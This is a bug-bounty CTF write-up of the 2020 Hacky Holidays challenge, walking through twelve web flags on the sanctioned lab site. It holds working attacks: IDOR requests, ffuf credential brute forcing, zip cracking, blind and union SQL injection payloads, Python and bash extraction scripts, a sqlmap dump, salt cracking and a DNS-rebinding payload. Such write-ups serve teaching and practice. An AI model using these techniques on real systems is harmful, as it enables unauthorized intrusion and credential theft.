# Hacky Holidays Writeup

## Report Details
- **Report ID**: 1067835
- **URL**: https://hackerone.com/reports/1067835
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-28T22:56:32.641Z
- **Disclosed**: 2021-01-12T17:59:25.974Z

## Reporter
- **Username**: cardinal
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
On December 12th, 2020, the CTF became live and the scope that we are allowed to attack was

```
In Scope Domain - **hackyholidays.h1ctf.com**
```

Our main motive was to infiltrate his network and take him down. The challenges appeared one by one till 24th of December. Here we will be going through all the steps taken to obtain all the flags.

# TL;DR
{F1133152}

# Detailed

## Flag 1 - KEEP OUT

It all started with hitting `hackyholidays.h1ctf.com`, we are greeted with a KEEP OUT sign. And we are not going to listen to the Grinch. So, on a little bit of enumeration found  `robots.txt`, which often contains some endpoints that can be utilize for further reconnaissance. 

In the `robots.txt`, the first flag was found with a `Disallow` entry of `/s3cr3t-ar3a`, which will be available for next day.

```
hackyholidays.h1ctf.com/s3cr3t-ar3a
```


## Flag 2 - Page Moved

On the second day, when we hit the `/s3cr3t-ar3a` endpoint, it shows that the page is moved with a message left behind that "If you're allowed access you'll know where to look for the proper page!" It means that we have to find the new endpoint for where this page has moved to.

This flag was bit tricky(at least for me). Upon checking the source code from `View Page Source` options and did other directory brute forcing, etc. but there was no where to go. 

Tinkering around the application bit more, when `inspected the web page using DOM`, it revealed some interesting information (flag and endpoint) that was not available in the source code.

{F1133157}
{F1133156}

But it was unsure to me, how it happened, so upon doing a bit research, came to know that the "View Source" simply **shows the HTML as it was delivered from the web server to our browser, where as, "Inspect Element" shows the current state of the DOM tree, after HTML error correction, HTML normalization and DOM manipulation by JS.** 

And it all made sense about this flag. I really loved this one. Now we have `/apps` endpoint, where [Grinch](https://twitter.com/adamtlangley) is going to post all other challenges for us to solve.


## Flag 3 - People Rater

Objective - **Find record that does not belong there.**

In `/apps` directory, on the third day, a new challenge appeared - **People Rater**, which contains a list of people which when clicked, gives rating(mostly bad).
{F1133158}

When each button is clicked, an ID is being passed in GET request, as following

```
GET /people-rater/entry?id=eyJpZCI6Mn0=
```

The ID is in base64 encoded form of `{"id":<number>}`. For example, in the above request the value for `?id=` results in `{"id":2}`.  The fun part is the list starts with id = 2. Passing the base64 encoded string of value `{"id":1}` it returns a different rating(which was good) and a flag.

```shell
$ curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= 
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

This vulnerability is an example of **IDOR - Insecure Direct Object Reference**, the get parameter passes a value that can be altered and can access other details, which was supposed to be hidden in this case.


## Flag 4 - Swag Shop

Objective - **Find Grinch's Personal Details from the online shop for Grinch Merch.**

Upon inspecting the source code, a JS code snippet was found, which revealed another endpoint, called `/api` and upon fuzzing that endpoint, we found

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -w common.txt -mc all -fc 404
...
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
...
```

In the `/api/sessions` we found 8 base64 encoded session and Grinch has messed up with all of it but one, which when decoded yield

```json
eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==

{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```

Now, we have value for `user` which looks like a `uuid` and a cookie. At the first sight, the cookie looked interesting, so after playing with it for some time and reaching no where. It was better to take another approach.

Another interesting endpoint was `/user` which receives GET request and after some guessing, when passed the value for `uuid` parameter with the `/api/user` endpoint it give the information of Grinch's account and the flag. 

{F1133159}

Another IDOR vulnerability, exploiting which, the attacker was able to access the details directly with the UUID.


## Flag 5 - Secure Login

Objective: **Try and find a way past the login page to get to the secret area.**

We were presented with a login form, which in it's error response says if the username/password is incorrect. So we can use it to filter the response and fuzz for username and password one at a time.

**Fuzzing for username:**
```shell
$ ffuf -u https://hackyholidays.h1ctf.com/secure-login -w  names.txt -d "username=FUZZ&password=something" -fr "Invalid Username" -H "Content-Type: application/x-www-form-urlencoded"
...
access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
...
```

**Fuzzing for password:**
```shell
$ ffuf -u https://hackyholidays.h1ctf.com/secure-login -w  10-million-password-list-top-10000.txt -d "username=access&password=FUZZ" -fr "Invalid Password" -H "Content-Type: application/x-www-form-urlencoded"
...
computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
...
```

Now, we have the credentials (`access:computer`) using which we can login, and upon login we get a page that shows
{F1133163}

Inspecting at the cookie (`securelogin`), we find it's base64 encoded and upon decoding it, we find it contains an attribute called `admin` and it was set as `false`.  So, tried to craft the `securelogin` cookie in such a way that it contains the user's cookie attribute untouched and change the `admin` attribute is set to `true`. 

Using [CyberChef](https://gchq.github.io/CyberChef) for the encoding and decoding,
{F1133164}

Then used the Dev Tools' Storage section to modify the cookie and reload the page to get a zip file,
{F1133165}

We now have a zip to work on and it's password protected, we can use `fcrackzip` to bruteforce the password, and on doing that we found the password and retrieved the flag.

```shell
$ fcrackzip -u my_secure_files_not_for_you.zip -D -p 10-million-password-list-top-10000.txt

PASSWORD FOUND!!!!: pw == hahahaha
```

`fcrackzip` here is being used with flags, 

- -u  →  use unzip to remove wrong password
- -D  →  use a dictionary for bruteforcing
- -p  →  to use string as initial password/file

and upon unzipping, it yield two files - flag.txt and xxx.png. 
{F1133166}

And it's day 5 and Grinch is still trying it's best to ruin the Christmas.


## Flag 6 - My Diary

Objective -  **Find out Grinch's upcoming event.**

The application seem to load and render files from the GET parameter. So, tried fuzzing the GET parameter, 

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ -w common.txt -mc 200
...
index.php               [Status: 200, Size: 689, Words: 126, Lines: 22]
...
```

When trying to render the `index.php` it gives blank page but the `Words: 126, Lines: 22` that `ffuf` gave us was contradicting the fact that the page was blank so upon inspecting the source of the page, it gives out `PHP` code.

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

Code Snippet demonstrated how templates are being rendered, and how to access the admin panel.

There is some validation on the value received from the template parameter. So, let's break it down-

- It only accepts characters - UPPER CASE and lower case alphabets, number from 0 to 9, and a dot(.)
- It nulls out the value, if the value entered is - `admin.php` or `secretadmin.php`

We have to get access to the `secretadmin.php` and if we try to directly access it, it gives a message

```
You cannot view this page from your IP Address
```

So we have to pass it through the template parameter, and in order to bypass the validation we have to craft a payload that can help us by pass all the checks.

Let's try crafting one,
{F1133167}

And passing this in the template, gives access to the secret admin panel.

```
https://hackyholidays.h1ctf.com/my-diary/?template=secretasecretadadmin.phpmin.phpdmin.php
```

{F1133168}

This was a case of weak input validation. And we can see Grinch's unlisted upcoming event and it seems real bad!!


## Flag 7 - Hate Mail Generator

Objective - **Find the hidden flag, as Grinch sends his mail by email campaigns.**

We have been given a campaign manager, where previous campaigns are listed and option to create a new one is also available. 

We have a listed campaign, which contains some data and we cannot create one because "you've run out of credits". But from this listed campaign we get to know how to include pre-made templates and other html tags are also allowed.

{F1133169}

So, there must be other templates that can be incorporated, and on performing directory bruteforcing, it yields a directory that lists different templates.

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ -w  common.txt
...
new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
...
```

{F1133172}

We found that there is this admin header, which cannot be accessed directly but maybe we can use it to incorporate as a template. 

Upon trying to create a new campaign, we are not allowed to create it but are allowed to preview it...and upon previewing we get a name, that we have not input.

{F1133171}

And it outputs the following result,

```
Hello Alice ....
```

Upon inspecting the source code, it was evident that "Alice" is coming from a hidden input field. So, we have a bunch of input field and injecting templates in the Name, Subject and Markup Fields does not result in success.

We can try to inject `38dhs_admins_only_header.html` in other field that are being rendered on the page, and in this case, the value from the hidden field is. 

Upon trying to inject the template in the `name` attribute - `{{template: 38dhs_admins_only_header.html}}` and submitting the form, gives us the flag!!

{F1133175}
{F1133174}


## Flag 8 - Forum

Objective - **Get access to admin section of the forum.**

Started off with directory bruteforcing gave some things to play with,

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/forum/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404
...
2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
...
```

After trying out different things on the application (that too of no use), went down the recon path. Searching for a bit, came across a commit that looked interesting, on [Adam Langley's GitHub](https://github.com/adamtlangley).

{F1133177}

And we have a code base, to look into. Enumerating the GitHub repository, we come across a commit that was for a `small fix` and that was to remove the hardcoded credentials, that was committed earlier.

{F1133179}

It's the leaked credentials for database, using which we can log in to `phpmyadmin` to get access to the database, where the the credentials were stored.

{F1133178}

And trying to crack the password hash using [CrackStation](https://crackstation.net/) gave us the Password for grinch (Admin).
{F1133180}

And using the credentials `(grinch:BahHumbug)`, we were able to login and check out the "Secret Plans" which gave us the flag and information about Grinch having Santa's Location!!

{F1133181}


## Flag 9 - Evil Quiz

Objective - **Find Flag and Have access to the admin area! ;)**

This was a quiz application to "Check how evil are you?" In the first page, it takes name as input then asks a few questions and gives rating (Out of 3) and number of people having the same name. 

{F1133183}

Now, this looks fishy. If I had to guess, the logic behind showing the "people with same name" can be,

```sql
select count(*) from table where name like "whatever";
```

And, yes after tinkering with it for a few moments, confirmed my doubt about SQL**i - Boolean based SQLi.**

**Identification-**  For a particular name, suppose there are 30 members and when I do something to break the syntax the number of members drops to zero (shows error).

```
name=admin'  # breaks the syntax
```

Upon doing some manual SQLi and guess work, got hold of a few things like

- `admin' AND (length(database())) = 4--`  - Gives the length of database name - 4 characters
- `admin' AND (ascii(substr((select database()),1,1))) = 113 --`  - Gives that the first character is `'q' (113)`

**Guess Work -** 4 characters and starts with 'q' - seems like `quiz` and we have our database name. And now using this we can try to figure out name of the table that is inside the database.

- `admin' AND (length((select table_name from information_schema.tables where table_schema='quiz' limit 0,1))) = 5 --`  - Gives the length of the table name - 5 characters
- `admin' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="quiz" LIMIT 0,1),1,1))) = 97--` - Gives that the first character is 'a'

**Guess Work -** 5 characters and starts with 'a' - seems like `admin` and we have out table name.

Similarly, we can do to find the column names and stuff but we can't keep on going this forever, there are two ways to approach this,

- We can use automated tool like `sqlmap` and
- We can script it (if anyone is interested, didn't use this method)

 ```python
 import requests
 import string

# All the printable characters
chars = string.printable
# Maintaining Session State
session = requests.Session()
final = ""
ct = 0
print("[*] Finding Password ... ")
password = 1
 while ct < 100 :
    ct = 1
    for char in chars:
        sqli="1' or (ascii(substr((select password from admin ) ,{},1))) ={} -- -".format(str(password),ord(char))
        post_parameters = {"name":str(sqli)}
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/84.0.522.63","Content-Type":"application/x-www-form-urlencoded"}
        cookies = {"session":"206979a74800a0190f1f04c10db5ca8c"}
        post_response = session.post("https://hackyholidays.h1ctf.com/evil-quiz", data=post_parameters, headers=headers, cookies=cookies)
        get_response = session.get("https://hackyholidays.h1ctf.com/evil-quiz/score", headers=headers, cookies=cookies)
        # print(char)
        if  'There is 0 other player(s)' not in get_response.text:
            final += str(char)
            print(final)
            break
        ct += 1
    password += 1
print('[+]Found: '.format(str(final))) 
```

I took taking the lazy way - `SQLMap`. Setting up `SQLMap` to use post data and redirection URL as well, with other headers and fact checking `--not-string` flag, along with the database and table specified, that we found earlier.

Without following redirects and merging the cookie, here we successfully ran the `sqlmap` that yield us the credentials.

```shell
$ sqlmap -u 'https://hackyholidays.h1ctf.com/evil-quiz' --data 'name=cardinal' --second-url 'https://hackyholidays.h1ctf.com/evil-quiz/score' --random-agent --not-string 'There is 0 other player' --technique=B --level=3 --risk=3 --cookie 'session=206979a74800a0190f1f04c10db5ca8c'  -D quiz -T admin --dump
...
+----+-------------------+----------+
| id | password          | username |
+----+-------------------+----------+
| 1  | S3creT_p4ssw0rd-$ | admin    |
+----+-------------------+----------+
...
```

Using which we can log into the admin zone to obtain the flag. 


## Flag 10 - Signup Manager

Objective - **Try to get into the Grinch's army (as an insider maybe xD)**

We have two forms - signup and login. And we have to leverage them to become the admin. Checking out the "View Source", it has a comment at the very beginning,

```html
<!-- See README.md for assistance -->
...
```

So, upon visiting [`https://hackyholidays.h1ctf.com/signup-manager/README.md`](https://hackyholidays.h1ctf.com/signup-manager/README.md), gave us the README.md file, which had other instructions mentioned to install `SignUp Manager`

```markdown
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

It mentioned one more file - `signupmanager.zip` which can be downloaded the same way as README.md by visiting - [`https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip`](https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip) 

```shell
SignUpManager
├── admin.php
├── index.php
├── README.md
├── signup.php
├── user.php
└── users.txt
```

`index.php` contained all the code for user creation and validation.

This was fun and easy. We have to perform source code review to find out the vulnerability that can help us become admin user.

All the components are properly validated and sanitized, except one - `age`. It was accepting any input from the browser.

There is only one condition check that is being performed is  that the length of the value of `age` cannot be more than three characters.

**Relevant Code Snippets [index.php]**

```php
...
'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
...
$line .= str_pad( $age,3,"#");
...
$age = intval($_POST["age"]);
...
```

What we can notice is that the code is trusting whatever is coming from the browser. In the case of `age` it accepts on 3 characters and then passes it to `intval()` that allows the input to be converted to a integer and get stored in the database (users.txt).

**Format of users.txt**

```php
$random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
$line = '';
$line .= str_pad( $username,15,"#");
$line .= $password;
$line .= $random_hash;
$line .= str_pad( $age,3,"#");
$line .= str_pad( $firstname,15,"#");
$line .= str_pad( $lastname,15,"#");
$line .= 'N';
$line = substr($line,0,113);
file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
```

It stores data in users.txt as

- It stores `username`, `firstname`, and `lastname` with 15 characters padding, that means cannot allow more than 15 characters.
- 2 md5 hash → `password` and `random_hash` = 64 characters
- `age` - 3 characters padding, cannot allow more than 3 characters
- and at the last it appends one character `N`.

Total character count = 113 and at last it `substr()` it to extract characters from 0 to 113.

According to the README.md, if a record in users.txt has `Y` at it's end, it becomes an `admin user`. There is not much we can tinker with, we can just use age to our advantage.

**Methodology**

To become `admin`, we need to omit out `N` in from the record, and put `Y` in place of that, we can use `age` and `lastname` to our advantage and get access.

Since we know, whatever value we pass in age get into `intval()` which makes the string as integer. So, what if we can pass 4 characters from `age` and put last character of `lastname` as `Y`. We are ADMIN!

To do that, we can intercept the request, change the age value to `1e3` which later passed in `intval()` outputs 1000 [4 characters] - it omits the `N` and pass the lastname's last character as `Y`. 

The desired request data will be,
{F1133184}

It creates an user successfully and we can login to get the flag.

{F1133185}


## Flag 11 - Grinch Recon

Objective - **Get Access to the Attack Box**

URL: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/`

Grinch is tracking Santa for last few years trying to locate his secret workshop and he had collected some photographs and stored them for us to analyze.
{F1133189}

Album URL: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k`
{F1133190}

Image URL: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9`

Which consists of base64 `data`'s value, which when decoded, gives and `image path` and `auth` token.

```json
# Album Hash: jdh34k
eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9 
=> {"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```

With initial unsuccessful attempts for de-hashing the `auth` hash and trying to change the `image path`, moved ahead for further enumeration and struggling to find some vulnerability, a hint was dropped and I was like "NOT AGAIN!"

{F1133186}

It then hit me that it might be SQLi-inception similar to the previous challenge I solved in the last CTF. But this time it was frustrating as hell. Let's see how was it!

Possible SQLi endpoints were `album` parameter and `data` parameter, but the `data` parameter felt very unlikely. Therefore, trying to find an SQLi on `album` for some time yield 404 and I was supper happy and annoyed at the same time 😂 and the payload that worked for me was:

```
.../r3c0n_server_4fdk59/album?hash=-1' union select 1,2,3 -- -
```

And at this point '3' got output on the screen to I decided to further enumerate the database.

- database - `recon`
- tables
    - `album`
        - id
        - hash
        - name
    - `photo`
        - id
        - album_id
        - photo

And reading the data inside the tables, gave an idea of how things are stored in the database. While enumerating the `photo` table

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-1' UNION ALL SELECT 1, 2, group_concat(album_id,",",id,",",photo,";\n") from photo-- -
```

{F1133192}

The image names are stored in the database and as we have seen in the base64 decoded JSON, it's the path.

```json
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```

Basically what it does is, takes the name and adds the other part to it and then generate an `auth` token for it. Therefore, we have to make the application generate an auth token for the any path that we want to visit

Playing with other parameters, we came to know that the 1st parameter takes the `album_id` that takes the `photo` and appends it to the path (`r3c0n_server_4fdk59/uploads/{filename}`) and renders it on the website.

We don't have access to the `/api` endpoint directly, so we can pass the path in the SQL query that will provide us access to the `/api/` endpoint. Let's see how:

```json
.../r3c0n_server_4fdk59/album?hash="-1' UNION ALL SELECT "-1' union all select NULL,NULL,'../api/endpoint'-- -",2,3-- -
```

This rendered a broken image on the site, and visiting the image URL: [`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2VuZHBvaW50IiwiYXV0aCI6IjliYzdkOWFhOTRlZTZkNTQyZGYyYzNjZWZjYWRlNjgxIn0=`](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2VuZHBvaW50IiwiYXV0aCI6IjliYzdkOWFhOTRlZTZkNTQyZGYyYzNjZWZjYWRlNjgxIn0=) gave a custom error message - `Expected HTTP status 200, Received: 404`

And according to the API documentation it was an invalid endpoint.

{F1133191}

Now, what we have to do is to find a valid endpoint and in order to do that, it is a 3 step process.

1. Bruteforce with a wordlist.
2. For each word, check the response
3. And if the response if not `Expected HTTP status 200, Received: 404`, we get a hit.

So, to achieve that we had to do a bit of scripting,

```bash
#!/bin/bash
# find_endpoints.sh : Script for finding the valid endpoint
# Usage: cat wordlist.txt | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}

word=$1

url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,'../api/${word}'--%20-%22,2,3--%20-"

# extracting image path
path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)

img_url="https://hackyholidays.h1ctf.com${path}"

if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 404" ]]; then 
        echo "${word}:${img_url}"
fi
```

And looping this script through the [common.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt) gave us two hits,

```shell
$ cat common.txt | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}
user:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==
ping:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3BpbmciLCJhdXRoIjoiOTMzZTJkMzk5NWE4MmIzZmQyODE1NWQyMjg3MDk1M2YifQ==
```

`user` and `ping`(a rabbit hole -.-) , `user/` seems to be interesting, so we can continue to enumerate on that, we can make few tweaks on the previous scripts to bruteforce for parameters, if we try for some random parameter with some random value, it gives us an error - `Expected HTTP status 200, Received: 400` i.e. Invalid GET/POST request. So, we can use this error message to enumerate on the parameter (`FUZZ?=anything`)

```bash
#!/bin/bash
# find_endpoints.sh : Script for finding the valid endpoint
# Usage: cat wordlist.txt | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}

url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,'../api/?${word}=anything'--%20-%22,2,3--%20-"

# extracting image path
path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)

img_url="https://hackyholidays.h1ctf.com${path}"

if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 400" ]]; then 
        echo "${word}:${img_url}"
fi
```

And looping over the script gave, two parameters `username` and `password`.

```shell
$ cat test.txt  | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}
username:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9YW55dGhpbmciLCJhdXRoIjoiZTkwN2ZmZTJiZDFjYTc1YmI5ODliYjFkYTZiYTAwNDAifQ==
password:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/cGFzc3dvcmQ9YW55dGhpbmciLCJhdXRoIjoiNWI1MGQ3MTVjZjYyYmRmYjY4ZWQ1ZGQ1YzU3ZDBkMDgifQ==
```

Now that we have username and password parameters we can starting looking for it's values, to check for any error message we try - `user?username=a` to get `Expected HTTP status 200, Received: 204`. Now we know what to negate to. But how is this searching in database? Theory:

```sql
select * from user where username like "whatever";
select * from user where username like "w%"; # if we don't know the complete thing
```

So, if we have to guess character by character we have to use wild card characters - `%` allows all the character, so we can use it like - `a%` to check if `a` is the first character or not. To do it manually, it will be too much of work, so let's script it out,

```bash
#!/bin/bash
# find_credentials.sh: Script for finding the valid credentials

charset=$(echo {a..z} {A..Z} {0..9})

# Extracting Username
ct=0
found=""
res=""
echo "[*] Finding Username..."
while [[ $ct -le 36 ]]; do
        ct=0
        for char in $charset
        do
                url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,'../api/user?username=${found}${char}%'--%20-%22,2,3--%20-"

                # extracting image path
                path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)

                img_url="https://hackyholidays.h1ctf.com${path}"
                if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 204" ]]; then 
                        echo ${char}
                        res=$res$char
                        found=${found}${char}
                        break 1
                fi
                ct=$(( ct+1 ))
        done
done
echo "Username: ${res}"

# Extracting Password
ct=0
found="s"
echo "[*] Finding Password..."
while [[ $ct -le 62 ]]; do
        ct=0
        for char in $charset
        do
                url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,%27../api/user?password=${found}${char}%%27--%20-%22,2,3--%20-"

                # extracting image path
                path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)

                img_url="https://hackyholidays.h1ctf.com${path}"
                if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 204" ]]; then 
                        echo ${char}
                        found=${found}${char}
                        break 1
                fi
                ct=$(( ct+1 ))
        done
done
echo "Password: ${found}"
echo "Done!"
```

Yields:

```shell
Username: grinchadmin
Password: s4nt4sucks
```

And we can use this username and password to log in to "Attack Box", where we get the flag.
{F1133193}


## Flag 12 - The End Game - "Attack Server"

Objective - **Stop the DDOS Attack.**

URL -  **`https://hackyholidays.h1ctf.com/attack-box`**
This is the final day of the "Hacky Holidays" and Grinch is ready to launch a DDOS attack on Santa's Servers. 
{F1133194}

When we try to launch the attack, what it does is it passes a payload as a GET request, and then that URL is redirected to another to open up a web based terminal which pings the IP of the Santa's Server.

```
https://.../attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

When we decode the payload it decodes to,

```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

Upon playing with the payload, a few things came to attention,

- The IP cannot be changed directly, without changing the hash
- There is validation of IP format and only accepts `[a-z][A-Z][0-9].`

So, we have to create a hash for the IP that we want to ping.

If we want to stop the Grinch, what we need to do is take down the services of the network, so in order to do that,  we can ping flood the Grinch's server.

So, let's see how we can break down the parts and solve each one of them.

### Make a way to ping any other IP.

In order to ping some IP we have to provide a protection hash along with it, in the base64 encoded payload. We have to find out a way to generate such hashes.

Passing the hash through crackstation gave nothing useful, so the hash must be having salt in it. So, what we can do is try to guess the salt, but what else the hash is containing - rough guess - it's the IP associated with the hash in the payload. 

After guessing and trying out combinations for sometime, it was evident that the hash is generated as `concatenation of salt and IP`.

A small script to bruteforce for the salt, would do the work

```python
# get_salt.py - finds salt of the hash by bruteforcing using rockyou.txt.
# Usage: python get_salt.py rockyou.txt
import sys, hashlib

file_path = sys.argv[1]
with open(file_path,'r', errors='replace') as f:
    words = f.readlines()

for word in words:
    result = word.strip()+'203.0.113.33'
    result = hashlib.md5(result.encode())

    if result.hexdigest() == "5f2940d65ca4140cc18d0878bc398955":
        print(word)
        break
```

So, it yields out the salt

```shell
mrgrinch463
```

Now, we have the salt, so we can use it to regenerate the hash for any IP that we want.

```
mrgrinch463<IP>
```

Pinging the [localhost](http://localhost) (127.0.0.1) was not helpful as the server does not allow that.
{F1133196}
{F1133195}
{F1133197}

So, it does not allows, us to ping directly, so we have to find some different way, it basically works in three step process

- Input the URL - it then resolves with DNS
- Checks if the resolved IP is not equal to 127.0.0.1
- If true, it continues to ping the URL

So, we have to first pass the check and then use it. This can be done using **DNS Rebinding (TOCTOU - Time of Check. Time of Use Vulnerability)**

Implements the DNS Rebinding using concept from this GitHub repo - [`https://github.com/taviso/rbndr`](https://github.com/taviso/rbndr)

```
7f000001.c0a80001.rbndr.us
```

The above mentioned URL will help in easy switch between the two IPs implemented in hex.

`7f000001` - 127.0.0.1

`c0a80001` - 192.168.0.1

So, when we ping the above URL, it resolves to 192.168.0.1 or 127.0.0.1, as the server randomly returns one of the addresses.

So, with a bit of luck and several tries by crafting a payload as below,

```
{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}

